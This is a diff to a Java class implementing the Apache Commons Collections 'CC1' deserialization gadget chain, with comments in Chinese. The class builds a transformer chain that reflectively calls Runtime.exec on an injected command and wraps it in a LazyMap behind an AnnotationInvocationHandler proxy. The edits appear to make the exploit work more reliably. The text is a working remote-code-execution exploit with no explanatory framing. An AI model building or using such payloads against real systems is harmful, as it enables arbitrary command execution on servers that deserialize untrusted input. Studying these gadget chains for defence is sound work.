@@ -10,6 +10,7 @@ import org.apache.commons.collections.map.LazyMap;
 import java.lang.annotation.Target;
 import java.lang.invoke.ConstantCallSite;
 import java.lang.reflect.*;
+import java.util.HashSet;
 import java.util.Map.Entry;
 
 import java.beans.PropertyEditor;
@@ -349,7 +350,8 @@ public class CC1Chain {
                 new ConstantTransformer(Runtime.class),
                 new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                 new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
-                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{injectedCmd})
+                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{injectedCmd}),
+                new ConstantTransformer(new HashSet<String>())
         };
 
         ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
@@ -364,7 +366,7 @@ public class CC1Chain {
          */
 
         // 构造一个 LazyMap
-        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), chainedTransformer);
+        LazyMap lazyMap = (LazyMap) LazyMap.decorate((Map) new HashMap(), chainedTransformer);
 
         // 构造一个代理
         String entryClass = "sun.reflect.annotation.AnnotationInvocationHandler";
@@ -377,7 +379,7 @@ public class CC1Chain {
         InvocationHandler AIHandler = (InvocationHandler) constructorAIHandler.newInstance(Override.class, lazyMap);
 
         // 接收参数：ClassLoader loader, Class<?>[] interfaces, InvocationHandler h
-        Map mapProxy = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, AIHandler);
+        Map mapProxy = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, AIHandler);
 
         // 用于反序列化的对象，readObject 的时候会调用里面 map 的 entrySet
         InvocationHandler h = (InvocationHandler) constructorAIHandler.newInstance(Override.class, mapProxy);
